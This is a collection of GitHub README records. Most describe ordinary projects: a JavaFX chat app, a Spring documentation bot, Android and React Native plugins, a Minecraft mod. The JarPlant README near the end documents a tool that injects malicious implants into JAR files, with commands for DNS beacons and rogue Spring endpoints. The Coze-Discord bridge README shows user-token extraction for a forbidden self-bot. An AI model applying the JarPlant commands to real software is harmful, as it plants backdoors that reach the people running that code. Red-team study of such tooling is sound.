- Ensure that the JavaFX library is properly configured in your IDE.

**3.** **Configure JavaFX:**

- Download JavaFX SDK if you haven't already.
- Configure the JavaFX SDK path in your project settings.

## How to Run

**1.** **Run the Server:**

- Run the Server.java file to start the server.
- The server will start listening on port 5003 by default.


**2.** **Run the Client:**

- Run the ClientController.java file to start the client.
- Enter your username in the login screen.
- Start chatting with other connected clients.

## Usage

- **Login:** Enter a username (between 4 and 15 alphabetic characters) to join the chat.
- **Send a Message:** Type your message in the input field and press enter or click the send button.
- **Send an Image:** Click on the image icon to select and send an image.
- **Send an Emoji:** Click on the emoji icon to select and send an emoji.
- **Receive Messages:** All incoming messages, images, and emojis will be displayed in the chat window.

## Screenshots

<img src=""https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Screenshots/Screenshot%202024-08-22%20184323.png"" width=""600px"" height=""auto"">

<img src=""https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Screenshots/Screenshot%202024-08-22%20184245.png"" width=""600px"" height=""auto"">

## Contributing

Contributions are welcome! Please fork this repository and submit a pull request with your changes.


## License

This project is licensed under the MIT License - see the [MIT License](LICENSE)  file for details.

## 
<br>

<div align=""center""> 
<a href=""https://github.com/sasmithx"" target=""_blank""><img src = ""https://img.shields.io/badge/GitHub-000000?style=for-the-badge&logo=github&logoColor=white""></a>
<a href=""https://git-scm.com/"" target=""_blank""><img src = ""https://img.shields.io/badge/Git-000000?style=for-the-badge&logo=git&logoColor=white""></a>
<a href=""https://maven.apache.org/download.cgi"" target=""_blank""><img src = ""https://img.shields.io/badge/Maven-000000?style=for-the-badge&logo=apachemaven&logoColor=white""></a>
<a href=""https://www.jetbrains.com/idea/download/?section=windows"" target=""_blank""><img src = ""https://img.shields.io/badge/intellij-000000?style=for-the-badge&logo=intellijidea&logoColor=white""></a>
<a href=""https://www.asus.com/lk/"" target=""_blank""><img src = ""https://img.shields.io/badge/asus%20laptop-000000?style=for-the-badge&logo=asus&logoColor=white""
<a href=""https://ubuntu.com/"" target=""_blank""><img src = ""https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white""
                                                
</div>

<br>

<p align=""center"">
  &copy; 2024 Sasmith Manawadu
</p>

",0,0,1,MIT
miliariadnane/spring-boot-doc-rag-bot,main,"<div style=""display: flex; align-items: center; justify-content: center; margin: auto;"">
  <img src=""docs/images/logo.png"" alt=""Logo"" width=180 height=180 />
  <h1>Spring Boot Documentation Bot</h1>
</div>

# 🌐 Description

> This repository contains a documentation bot powered by a large language model (LLM) using LangChain4j to quickly find answers to your Spring Boot questions. It allows easy browsing of Spring documentation and leverages retrieve and gather (RAG) to extract relevant details on demand. The bot is built with Spring Boot and uses LangChain4j to ingest Spring documentation URLs into the model for enhanced question answering about Spring frameworks and the overall Spring ecosystem.

## 📚 Table of Contents

- [Prerequisites](#-prerequisites)
- [Installing](#-installing)
- [Built With](#-built-with)
- [License](#-license)
- [Support](#-support)
- [Application Screenshot](#-application-screenshot)

### 📋 Prerequisites

- Java 20
- Maven
- API keys for [Open API](https://platform.openai.com/)

### 🔧 Installing

1. Clone the repository on your local machine.
    ```shell
    git clone https://github.com/miliariadnane/spring-boot-doc-rag-bot
    cd spring-boot-doc-rag-bot
    ```
2. Open the `application.yml` file and replace `OPEN_API_KEY` with your own Open API key. For demo purposes, you can use the key ""demo"".

3. Build the project.
    ```shell
    mvn clean install
    ```
4. Run your Spring Boot application.
    ```shell
    mvn spring-boot:run

## 🛠️ Built With

- [Spring Boot](https://spring.io/projects/spring-boot) - The web framework used
- [Maven](https://maven.apache.org/) - Dependency Management
- [LangChain4j](https://github.com/langchain4j) - Used for integration of AI/LLM models into Java applications

## 📝 License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details

## 🌟 Support

> If you find this project useful or interesting, please consider giving it a star ⭐ on GitHub. Your support is greatly appreciated!
> Also, if you have a moment, don't forget to make a duaa 🤲 for me and my parents. Thank you for your support!

## 📸 Application Screenshot

![Screenshot](docs/images/screenshot.png)
",0,0,1,
xu-shawn/Serendipity,master,,6,1,369,GPL-3.0
abhishekabhi789/LyricsForPowerAmp,master,"<div align=""center"">

![App Icon](assets/app_icon.png)
<br>
![App Name](assets/app_name.png)
<br>
<a href=""https://developer.android.com/tools/releases/platforms#5.0"">
<img alt=""API 21+"" src=""https://img.shields.io/badge/API-21%2B-brightgreen.svg?style=for-the-badge&color=FF0800"" title=""Android 6.0 Marshmallow""></a>
<a href=""https://github.com/abhishekabhi789/LyricsForPowerAmp/releases"">
<img alt=""Download count"" src=""https://img.shields.io/github/downloads/abhishekabhi789/LyricsForPowerAmp/total?style=for-the-badge&color=00C853"" title=""Total download count""></a>

A lyrics plugin for [PowerAmp](https://powerampapp.com/) <br>
</div>

- Lyrics are pulled from LRCLib over internet connection.
- To reset/delete all lyrics set by this plugin, perform a full rescan `PowerAmp Settings -> Library -> Full Rescan`

### :flower_playing_cards: Screenshots
![App Screenshots](assets/Screenshots_L4PA.png)
### :shield: Permissions
- Internet
### :books: References
1. [PowerAmp API](https://github.com/maxmpz/powerampapi)
2. [LRCLib](https://lrclib.net/)
### :gift_heart: Suport

<a href='https://ko-fi.com/X8X1V9VTH' target='_blank'><img height='36' style='border:0px;height:36px;' src='https://storage.ko-fi.com/cdn/kofi1.png?v=3' border='0' alt='Buy Me a Coffee at ko-fi.com'/></a>",10,2,1,
NekoCurit/Coze-Discord-Bridge,main,"﻿<div align=""center"">

# Coze-Discord-Bridge

_免费的ChatGPT Turo 128k API_

_通过 `discord bot`调用 `coze 托管 discord bot`实现`免费使用GPT-4作为API`_

_觉得有点用的话 别忘了点个🌟_

</div>

## 停止维护

已停止维护 推荐个类似的

[Coze-Discord-Proxy](https://github.com/deanxv/coze-discord-proxy)

## 截图
![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/24e4304b-a5f7-4baa-9559-8c01f9a935b3)

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/285d33e5-6898-4324-8f9c-8842f3a3912c)

## 功能

注:是最新源代码里支持的功能 不是Release里的 要看Release的往前翻Commit api文档 配置文件同样
- [X] 适配`NextChat`,`LobeChat`等可以修改OpenAPI URL的AI平台
- [X] HTTP/HTTPS API支持
- [X] 支持文生图(需`coze`配置`DALL·E3`/`DALL·E2`插件)返回图片url
- [X] 支持图生文(需`coze`配置`GPT4V`插件)(发送的文本消息中携带图片url/自己上传base64图片)
- [x] 支持对话隔离
- [X] 对话支持流式返回
- [X] 支持和`openai`对齐的对话接口(`v1/chat/completions`)
- [X] 支持和`openai`对齐的图像生成接口(`v1/images/generations`)
- [X] 突破Discord Bot 2k字消息长度上限
- [X] 定时活跃机器人 自定义活跃间隔 避免bot因为太久未互动而离线
- [ ] 导入此jar进行二次开发 [::80%]
- [ ] WebUI
- [ ] 多个Bot 负载均衡
- [ ] Token计数

大饼很甜,苦了的只是猫猫

## 部署准备材料

1.一个Windows/Linux/...机器 (只要能运行java,能联网就行)  需要安装java (推荐jdk17 已知jdk8及以下版本不兼容)

2.一个代理服务器/材料一的机器在国外

3.一个手机号/Google账号

4.一个Discord账号

## 部署

1.下载Release或者自行构建

2.运行一遍 `java -jar CozeDiscordBridge-xxxxxx.jar` 如果一切正常,你可以在运行目录看到  `Config.yml` 配置文件

3.打开配置文件,进行编辑

````
#Github: https://github.com/catx-feitu/coze-discord-bridge
Bots:
   - #访问密钥 留空或default 表示无需密钥 通过不同的密钥链接不同的bot
     Key: ""default""
     #登录协议
     Protocol: ""discord""
     #Discord user token
     #打开Discord(推荐注册小号 因为UserBot 本身Discord就禁止) 按下F12打开开发者模式
     #点进网络 随便选择一个 复制请求头中的 Authorization 粘贴在这里
     Token: """"
     #[仅Discord可用]创建频道时使用的父频道 (也可以理解成 分组) 打开开发者模式 右键就可以看到ID 为空关闭
     CreateChannel_Category: """"
     #Coze Bot所处的服务器ID 打开Discord开发者模式 右键服务器复制过来即可
     Server_id: """"
     #接入Coze的Bot id 邀请进服务器在用户列表右键 复制用户ID 过来即可
     CozeBot_id: """"

#配置是否启用代理  代理类型 HTTP 或 SOCKS 常用于中国大陆机器部署
UsingProxy: false
ProxyIP: 127.0.0.1
ProxyPort: 8080
ProxyType: HTTP

#API端口设置为0关闭 如果HTTP和HTTPS都监听失败则无法启动
#API端口 默认8092 curl http://127.0.0.1:8092/Ping
APIPort: 8092
#API HTTPS 端口 默认8093 curl https://127.0.0.1:8093/Ping
APISSLPort: 8093
......
````
首先你要在[Discord开发者平台](https://discord.com/developers/)创建一个Application

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/41310da4-5db7-46df-946d-de642b64f985)

点击Bot 然后获取Token 复制保存到其它地方

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/bf45bbd4-0039-4723-b781-38854b607bbc)

往下滑动 开启下面三个按钮 随后点击保存

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/dd4a278d-9bac-45b4-b871-f3c92a136172)

点击Oauth 勾选Bot 然后往下滑勾选Administrator (省事 如果注重安全性那么请确保 链接到Coze的bot能收发和编辑消息 链接到Coze-Discord-Birdge的bot能收发消息和创建删除子频道)

复制下方生成的URL

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/8bb919a9-0dd5-480e-8062-2733b5ef5084)
之后第二个Bot相同的操作 这样你就有了两个Token 两个URL

打开Discord App(网页版亦可) 创建一个服务器

然后依次打开两个URL 把两个bot都添加进服务器

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/1c72bf00-dfc7-48fe-adb8-fcfcbf05ad95)

点击左下角设置打开Discord设置

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/2310f3c6-1060-4b18-a026-0feaaf1a82e0)



之后登录[Coze AI Studio](https://www.coze.com/)创建一个Bot
![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/9de286bf-d6bd-43a4-a2a0-8566dd706d84)

之后可以配置Bot 添加插件(要能AI画图必须添加) 调整GPT设置之类的(Dialog round = 对话轮数  推荐拉满) 最后点击右上角Publish

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/cf33dfef-33f6-420c-8473-aecddb789432)

输入 Token 点击保存 然后Publish

ps:Changelog必填 随便写即可 如果你有强迫症的话那..不太建议..

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/f5b32f9e-8f9b-484a-afcd-7a935904dd45)

如果配置正确你应该能看到托管到Coze的机器人上线了

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/580a331d-713f-4686-961e-8c3169bcbee4)

下滑 找到高级设置 开启开发者模式

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/ca33a63f-6de7-44d5-b6bb-b13162712056)

点击左上角复制服务器ID

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/d84f4363-a0f6-4f05-abc8-798f5742794a)

点击右侧复制Bot 用户ID

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/9b560037-9d4d-4324-892d-dbb8bcc90bc3)

在Config中保存这两个ID

````
     ......
     #Coze Bot所处的服务器ID 打开Discord开发者模式 右键服务器复制过来即可
     Server_id: ""xxxxxx""
     #接入Coze的Bot id 邀请进服务器在用户列表右键 复制用户ID 过来即可
     CozeBot_id: ""xxxxxx""
     ......
````

回到Discord页面 按下F12打开浏览器开发者页面

点击网络(Network) 随便选择一个 复制请求头 Authorization

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/7d802fb5-4c62-458f-83da-c0b7770fd6d1)

保存到配置中
````
     ......
     #Discord user token
     #打开Discord(推荐注册小号 因为UserBot 本身Discord就禁止) 按下F12打开开发者模式
     #点进网络 随便选择一个 复制请求头中的 Authorization 粘贴在这里
     Token: ""xxxxxxxxxxxxxxx""
     ......
````
4.再次运行 `java -jar CozeDiscordBridge-xxxxxx.jar` 如下显示则正常  如果您是使用的是Windows且控制台编码为GBK 请先执行`chcp 65001`

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/803bfe60-39d5-42d5-b1b3-7aaf932a2808)

ps:第一次启动报错 `读取 cache_names.json 失败` 正常 直接忽略即可

5.最后可通过curl或者其它工具测试 如果服务器内你的账号自动向机器人提问 随后机器人回答就是部署成功

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/a87d04ac-5c52-4929-bb7c-ff62bd2fde65)

## (可选)keepalive

因为Discord/Coze问题 当bot很长时间不互动会离线 遇到这种情况需要去Coze手动重新登录 很麻烦

因此 你可以通过编辑配置开启keepalive功能

它可以自动与Coze托管的bot对话 当累计到一段时间bot没有被互动过

````
......
# Keepalive 通过定时与Coze托管的bot互动防止因为太久未发言而被强制下限
# 内置定时器执行周期 单位分钟  设置 0 关闭  关闭后也可以通过api调用keepalive
Keepalive_timer: 0
# 只有大于指定分钟未发言Coze托管的bot才执行keepalive 单位分钟
Keepalive_maxIntervalMinutes: 720
# keepalive发送消息所在频道
Keepalive_sendChannel: ""keepalive""
# keepalive发送消息内容
Keepalive_sendMessage: ""keepalive""
````

当关闭内置定时器时 你也可以通过访问终结点`/api/keepalive`来执行keepalive任务

## API文档

[传送门](https://github.com/catx-feitu/Coze-Discord-Bridge/wiki)

````

## 免责申明

本项目中的任何代码/构建产品仅供学习使用

使用即代表您承担一切滥用所造成的后果

作者不保证软件绝对稳定 如果有能力请使用[Coze API](https://www.coze.com/open)

",6,0,2,MIT
OpenCubicChunks/CubicChunks3,1.20.4,"# Cubic Chunks 3

## Not yet usable or functional, don't try.

Rewrite of the previous rewrite, targeting NeoForge/MC 1.20.4. 

This Minecraft mod extends Minecraft height and depth to be nearly infinite (at least a million blocks).

For the most up-to-date information about this mod and its related mods, as well as the newest downloads, please join us on the [**Cubic Chunks Discord**](https://discord.gg/kMfWg9m).

### Cubic Chunks (CC) - Links:

Github - [Cubic Chunks - 1.20.4 and above](https://github.com/OpenCubicChunks/CubicChunks3)  
Github - [Cubic Chunks - 1.12.2 and lower](https://github.com/OpenCubicChunks/CubicChunks)

### Cloning the repository

Note: you need git installed to do the following:
```
git clone --recursive
```
You need a git submodule for the project to compile.
If you don't yet have the submodule but already cloned the repository:
```
git submodule update --init --recursive
```

To get latest version of the submodule:
```
git submodule update --recursive --remote
```

### .git-blame-ignore-revs
Configure commits to be ignored for git blame:

```shell
git config blame.ignoreRevsFile .git-blame-ignore-revs
```

### Running the game

If running with IntelliJ, ensure that `io.github.opencubicchunks.[folder name].main` is selected, not `[folder name].main`:

![image](https://github.com/OpenCubicChunks/CubicChunks2/assets/18627001/0d88d6b5-0944-44f1-9461-fc90daef5766)

### Contributing

#### PR Guidelines
- All mixin methods and fields _**must**_ have a `cc_` prefix // todo automate this check in gh workflows.
- If a class is significantly modified with mixins, it _**must**_ have documentation explaining:
	- The original vanilla behaviour, can mention important fields/methods.
		- If the vanilla class has sufficient javadoc (through parchment), this can be skipped. Our javadoc should link to the parchment javadoc.
	- The goal of all mixins targeting the class.
- Any merged mixins _**must**_ have tests associated with them. 
	- If a mixin is ""untestable"" its test class should have a comment explaining *why* it's untestable. 
		- Optionally a to-do (project task? issue?) suggesting integration tests when possible.
	- All non-trivial mixins _**must**_ have a comment explaining their purpose.
	- _**Must**_ pass checkstyle.
	- _**Must**_ build.
	- All tests _**must**_ pass (no regressions).
	-  //todo Investigate code coverage for mixin tests ([jacoco?](https://docs.gradle.org/current/userguide/jacoco_plugin.html) [other link maybe it's bad](https://igorski.co/generating-junit-test-coverage-using-gradle-and-jacoco/)) .
- Any non-mixin class _**must**_ have tests associated with it.
	- The tests should reasonably cover all expected usage of the class (its external api).
	- Any method(s) that can be reasonably unit tested _**must**_ be.
(TODO more contributing docs)
",0,8,1,MIT
swan-io/react-native-browser,main,"# @swan-io/react-native-browser

An easy-to-use in-app browser module for React Native, powered by **[Chrome Custom Tabs](https://developer.chrome.com/docs/android/custom-tabs)** / **[SFSafariViewController](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**.

[![mit licence](https://img.shields.io/dub/l/vibe-d.svg?style=for-the-badge)](https://github.com/swan-io/react-native-browser/blob/main/LICENSE)
[![npm version](https://img.shields.io/npm/v/@swan-io/react-native-browser?style=for-the-badge)](https://www.npmjs.org/package/@swan-io/react-native-browser)
[![bundlephobia](https://img.shields.io/bundlephobia/minzip/@swan-io/react-native-browser?label=size&style=for-the-badge)](https://bundlephobia.com/result?p=@swan-io/react-native-browser)
<br />
[![platform - android](https://img.shields.io/badge/platform-Android-3ddc84.svg?logo=android&style=for-the-badge)](https://www.android.com)
[![platform - ios](https://img.shields.io/badge/platform-iOS-000.svg?logo=apple&style=for-the-badge)](https://developer.apple.com/ios)

<p>
  <img width=""261"" src=""./docs/demo.png"" alt=""Demo"">
</p>

## Installation

```bash
$ yarn add @swan-io/react-native-browser
# --- or ---
$ npm install --save @swan-io/react-native-browser
```

## Quickstart

```tsx
import { openBrowser } from ""@swan-io/react-native-browser"";
import { useCallback } from ""react"";
import { Button, SafeAreaView } from ""react-native"";
import parseUrl from ""url-parse"";

const App = () => {
  const handleOnPress = useCallback(() => {
    openBrowser(""https://swan.io"", {
      onClose: (url) => {
        if (url) {
          const { protocol, host, query } = parseUrl(url, true);
          const origin = `${protocol}//${host}`;

          if (origin === ""com.company.myapp://close"") {
            console.log(JSON.stringify(query, null, 2));
          }
        }
      },
    }).catch((error) => {
      console.error(error);
    });
  }, []);

  return (
    <SafeAreaView>
      <Button title=""Open browser"" onPress={handleOnPress} />
    </SafeAreaView>
  );
};
```

## API

### openBrowser(url: string, options: Options)

```tsx
import { openBrowser } from ""@swan-io/react-native-browser"";

openBrowser(""https://swan.io"", {
  animationType: """", // ""fade"" | ""slide"" (default to ""slide"")
  dismissButtonStyle: ""close"", // ""cancel"" | ""close"" | ""done"" (default to ""close"")
  barTintColor: ""#FFF"", // in-app browser UI background color
  controlTintColor: ""#000"", // in-app browser buttons color
  onOpen: () => {
    // fired on browser opened
    // useful to switch the StatusBar color, for example
  },
  onClose: (url) => {
    // fired on browser closed
    // url will be defined if the browser has been closed via deeplink
  },
}).catch((error) => {
  console.error(error);
});
```

> [!IMPORTANT]
> On Android, the Chrome app must be opened at least once for this to work — a step often overlooked when using emulators in development.

## Handle deeplinks

In order to receive deeplink on browser close event, you have to setup them first. We **highly** recommand defining a custom schema + url for this specific task. For example, `com.company.myapp://close`.

### On iOS

First, you need to **[enable react-native deeplinks support](https://reactnative.dev/docs/linking#enabling-deep-links)**. Then, edit your `Info.plist` file to add:

```xml
<key>CFBundleURLTypes</key>
<array>
  <dict>
    <key>CFBundleTypeRole</key>
    <string>Viewer</string>
    <key>CFBundleURLName</key>
    <string>com.company.myapp</string>
    <key>CFBundleURLSchemes</key>
    <array>
      <string>com.company.myapp</string>
    </array>
  </dict>
</array>
```

### On Android

Edit your `AndroidManifest.xml` to add ([more documentation](https://developer.android.com/training/app-links/deep-linking)):

```xml
<activity android:name="".MainActivity"">
  <intent-filter>
    <action android:name=""android.intent.action.VIEW"" />
    <category android:name=""android.intent.category.BROWSABLE"" />
    <category android:name=""android.intent.category.DEFAULT"" />
    <data android:scheme=""com.company.myapp"" android:host=""close"" />
  </intent-filter>
</activity>
```

> [!TIP]
> Once the redirect URL is visited (a `GET` hits your server), handle the result and perform a server redirect to `com.company.myapp://close?success=true` to close the browser (and pass any data back to your app using query params ✨).

## Run the example app

```bash
$ git clone git@github.com:swan-io/react-native-browser.git
$ cd react-native-browser/example

$ yarn install && yarn start
# --- or ---
$ npm install && npm run start
```
",9,1,1,MIT
w1th4d/JarPlant,main,"# Java Archive Implant Toolkit

Inject malicious payloads into JAR files.

## Quickstart

Building:

```
git clone git@github.com:w1th4d/JarPlant.git
cd JarPlant
mvn package
mv jarplant-cli/target/jarplant-cli-<version>-jar-with-dependencies.jar jarplant.jar
```

Make sure to substitute `<version>` with the current version.

Usage:

```
       _____               ______  __                __   
     _|     |.---.-..----.|   __ \|  |.---.-..-----.|  |_ 
    |       ||  _  ||   _||    __/|  ||  _  ||     ||   _|
    |_______||___._||__|  |___|   |__||___._||__|__||____|
    Java archive implant toolkit   v0.1   by w1th4d & kugg

positional arguments:
  command
    class-injector       Inject a class implant  into  any JAR. The implant
                         will detonate whenever  any  class  in  the JAR is
                         used but  the  payload  will  only  run  once  (or
                         possibly twice in  some  very  fringe cases). This
                         is the most versatile implant  type and works with
                         any JAR (even ones  without  a main function, like
                         a library).
    spring-injector      Inject  a  Spring  component   implant  into  JAR-
                         packaged Spring  application.  The  component will
                         be loaded and included in  the Spring context. The
                         component could be  something  like  an extra REST
                         controller or scheduled task.
    implant-list         List all bundled implants.
    implant-info         See more details  about  a  specific implant. This
                         includes reading its  class  to  see all available
                         configuration properties and  their  data types. A
                         class file path can be  specified to read a custom
                         implant.
    decoder              Utility to decode stuff  generated  by some of the
                         built-in payloads.

named arguments:
  -h, --help             show this help message and exit

for more options, see command help pages:
  $ java -jar jarplant.jar class-injector -h
  $ java -jar jarplant.jar spring-injector -h
    ...

example usage:
  $ java -jar jarplant.jar class-injector \
    --target path/to/target.jar --output spiked-target.jar
```

## Quick grabs

These are some examples of things you may be interested in.

Spike any Java app or library to call home to an out-of-band DNS catcher (like Interactch or Burp Collaborator):

```shell
java -jar jarplant.jar class-injector \
   --target path/to/target.jar \
   --implant DnsBeaconImplant \
   --config CONF_DOMAIN=$YOUR_OAST_DOMAIN 
```

Replace `$YOUR_OAST_DOMAIN` with your `*.oast.fun` domain (or whatever out-of-band service you use).

Decode the domain name caught by your DNS server:

```shell
java -jar jarplant.jar decoder $ENCODED_FQDN 
```

Replace `$ENCODED_FQDN` with the domain name in the DNS query.

Spike a Spring Boot app to include a rogue REST endpoint:

```shell
java -jar jarplant.jar spring-injector \
   --target path/to/target.jar \
   --implant-component SpringImplantController \
   --implant-config SpringImplantConfiguration 
````

You'll want to modify `StringImplantController.java` for this one do to anything interesting.
The default is to create a REST controller routed to `/implant` that just gives a dummy response.

Spike any JAR with your own custom implant code:

```shell
java -jar class-injector \
   --target path/to/target.jar \
   --implant ClassImplant 
```

Where your custom implant code resides in the `payload()` method of `ClassImplant.java`.

Spike any JAR with an implant that will always finish no matter what:

```shell
java -jar class-injector \
   --target path/to/target.jar \
   --implant ClassImplant
   --config CONF_BLOCK_JVM_SHUTDOWN=true 
```

Be careful with blocking operations in your payload code.

## Configuration

JarPlant supports injection of custom values with the implants.
A set of common configuration properties are defined with the template and built-in implants.
These are:

| Configuration property    | Data type | Description                                                                                                    | Default value     |
|---------------------------|-----------|----------------------------------------------------------------------------------------------------------------|-------------------|
| `CONF_JVM_MARKER_PROP`    | String    | JVM system property to create and use as a ""marker"" to determine if an implant has been detonated in this JVM. | `java.class.init` |
| `CONF_BLOCK_JVM_SHUTDOWN` | boolean   | Controls whether the implant's thread will block the JVM from fully exiting until the implant is done.         | `false`           |
| `CONF_DELAY_MS`           | int       | Optional delay (in milliseconds) before the implant payload will detonate.                                     | `0`               |

See the `ClassImplant` template Javadoc for mor info in these properties.

### Blocking the JVM exit

Be extra careful with the `CONF_BLOCK_JVM_SHUTDOWN` property.
If this is set to `true`, then the JVM will wait for your payload to finish its execution.
If your payload takes a long time, then the spiked app will fail to exit properly.
It's _not_ recommended to set a non-zero `CONF_DELAY_MS` value together with `CONF_BLOCK_JVM_SHUTDOWN=true`.

If you've injected an implant into an app that exits very quickly, then your payload may not get enough time to execute
if `CONF_BLOCK_JVM_SHUTDOWN` is set to `false` (which is the default setting).

As a general rule of thumb, only set `CONF_BLOCK_JVM_SHUTDOWN` to `true` if your implant is quick to execute and/or it's
absolutely essential that it _must_ finish.

For any target apps that takes some time to run (like a back-end service), there should be plenty time for your implant
to do its thing with `CONF_BLOCK_JVM_SHUTDOWN` set to its default value of `false`.

## Quickly implement a custom implant

For a one-off in a rush, the simplest and fastest way of getting your own custom Java code into a target JAR is to:

1) Clone this code repository.
2) Modify the `payload()` method inside `ClassImplant.java` with your own code.
3) Build JarPlant: `mvn clean package`.
4) Run the CLI. See the ""Quick grabs"" section above.

Alternatively, if you're spiking a Spring app: Modify the `SpringComponentImplant.java` (and maybe the
`SpringConfigurationImplant.java`) and use the `spring-injector` CLI accordingly.

## Using the JarPlant library

To invoke JarPlant from your own Java code, first run `mvn clean install` in the root directory of the JarPlant code
repository.
Then, include it in the `pom.xml` (or equivalent) of your own project:

```xml
<dependency>
  <groupId>io.github.w1th4d.jarplant</groupId>
  <artifactId>jarplant-lib</artifactId>
  <version>1.0-SNAPSHOT</version>
</dependency>
```

These coordinates _will be changed_ soon. It will also be published to Maven Central when it's properly released.

Example usage in your code:

```java
public class Demo {
    public static void main(String[] args) {
        try {
            ImplantHandler implant = ImplantHandlerImpl.findAndCreateFor(ClassImplant.class);
            implant.setConfig(""CONF_BLOCK_JVM_SHUTDOWN"", true);

            Path target = Path.of(""target.jar"");
            JarFiddler jar = JarFiddler.buffer(target);

            Injector injector = ClassInjector.createLoadedWith(implant);
            boolean succeeded = injector.injectInto(jar);
            if (succeeded) {
                jar.write(target);
            }
        } catch (ClassNotFoundException | IOException | ImplantException |
                 ImplantConfigException e) {
            throw new RuntimeException(e);
        }
    }
}
```

You may want to include the `jarplant-implants` submodule for access to `ClassImplant`:

```xml
<dependency>
  <groupId>io.github.w1th4d.jarplant</groupId>
    <artifactId>jarplant-implants</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

However, if you write your own code like this, it would be better to copy the `ClassImplant` template into your own
project and customize it according to your needs.
Give it a cool name while you're at it.

You may also introduce new configuration properties. Just make sure they're `public`, `static`, `volatile` and has a
name prefixed with `CONF_`.
If no default value is used for a property, then a value must be provided using `ImplantHandler.setConfig()` before
injection.

## Library components

JarPlant is written as a Java library and framework for you to write your own implants.

There are a number of key components to JarPlant. These are `ImplantHandler`, `JarFiddler` and `Injector`.

### ImplantHandler

This class (its implementation `ImplantHandlerImpl`) is used to find, load and configure implants.

This API is subject to change soon.

### JarFiddler

This class is used to read, modify and write a JAR file.

The default implementation will read and buffer the contents of an entire JAR into memory.
The injectors can then operate upon the `JarFiddler` in-memory.
The user of the JarPlant API is expected to invoke the `write()` method if the injector succeeds.

### Injectors

These are the classes that does most of the bytecode manipulation of classes inside a JAR.

There are different implementations for various types of JARs/apps: `ClassInjector` and `SpringInjector`.

#### ClassInjector

Operates upon any JAR file containing arbitrary classes.
The JAR does _not_ have to be executable or contain a class with a `public static void main(String[] args)` function.
Any class will do. This works for libraries and dependencies, too.

When the target JAR is run or used by another app, the implant will trigger.

#### SpringInjector

Specifically looks for a Spring configuration classes and injects a Spring component in the same package namespace.
If _component scanning_ is not enabled by the target app, then the SpringInjector will also inject a `@Bean`-annotated
method in the configuration in order to reference the implanted component.

The Spring implant template will register a new HTTP request mapping for the app.
Requests going to that endpoint (`/implant` by default) will be handled by the implant.
You're encouraged to modify `SpringComponentImplant.java` with your own custom code.

## Implants

JarPlant is intended to serve as a framework for developers to implement their own implants.

The template for the `ClassInjector` is `ClassImplant`.
Please delve into it, read its Javadoc and fill in the `payload()` method appropriately.

The `SpringInjector` uses two different implants: A _Spring component_ implant and a _Spring configuration_ implant.
Both needs to be supplied and maintained, but the `SpringInjector` may skip the Spring configuration implant if it's not
necessary.
Future versions may (hopefully) be able to generate the Spring configuration implant during injection, but it needs to
be supplied explicitly for now.

## Maven modules

This project is divided into a set of Maven modules:

* **jarplant-cli** is where the executable main function is. It gives the user a Command Line Interface to use the
  JarPlant functionality in a user-friendly way.
* **jarplant-implants** is where the various example implants are located. A savvy user is encouraged to write custom
  implants as appropriate.
* **jarplant-lib** is where the main functionality is. This module is designed to contain only the essential
  functionality for portability.
* **test-app-pojo** is a very minimal plain Java app that can be used for test the class implants.
* **test-app-spring-simple** is a simple Spring Boot application for testing the Spring implants.
  It's just a `@SpringBootApplication` with one configuration and controller.
* **test-app-spring-complex** tries to simulate a more intricate Spring app with several `@Configuration` classes in
  different sub-packages. It includes configurations without component scanning enabled, several configurations in
  the same package and other exotic cases worth testing for.
* **test-implant-class** and **test-implant-spring** are used internally for tests.

## Test suite

Testing JAR and bytecode manipulation can be a bit tricky. Please try to include any bug or corner case into its own
Junit test. Don't be afraid of adding to the test apps and test implants, just don't break any other tests in the
process. Add a new submodule with a test app/implant that narrows in on the test case if necessary. *Don't* check in
a blob like a JAR file or anything. Any test apps needs to be provided by source and pom. Try to keep it to the point.

### Test automation

Most tests reside in `jarplant-lib/src/test` that houses a mix of unit tests and end-to-end tests.
The tests use a combination of dummy classes and ""live samples"" from the other Maven submodules.
These submodules are set up to build a proper JAR file and then copy it into the resource folder of the tests.
See their `pom.xml` files for details. It's a bit out of the ordinary and may generate some warnings in Maven.  
Just make sure to run `mvn package` in the project root before running any tests in isolation.

The tests in `jarplant-lib` are a mix of unit tests and end-to-end tests.

### Manual testing and troubleshooting

When developing JarPlant or its implants, it's been very useful to use the `javap` tool provided with the JVM.

Example:

```
mkdir /tmp/jarplant-debug
cd /tmp/jarplant-debug
unzip ../path/to/jarfile/my-app.jar

javap -c -v io/github/w1th4d/jarplant/test/Main.class | less
```

Replace directories and paths as appropriate. The key here is the `javap` command. It's great for disassembling and
peaking into the JVM bytecode. Do this before and after a JarPlant run and investigate the diffs.

Consider to use the manual testing procedure as a tool to narrow down on a bug and then express that bug as a Junit
test. That way, it's easy for someone to fix the bug by satisfying the test. Alternatively, just fix the bug and create
a PL. You can always just create a GitHub Issue to explain the problem if you're unable to express it as a test or fix
it yourself. A reported Issue is better than nothing.

## Future work

There's a lot of work that still needs to be done. See the Issues section on GitHub for more details.

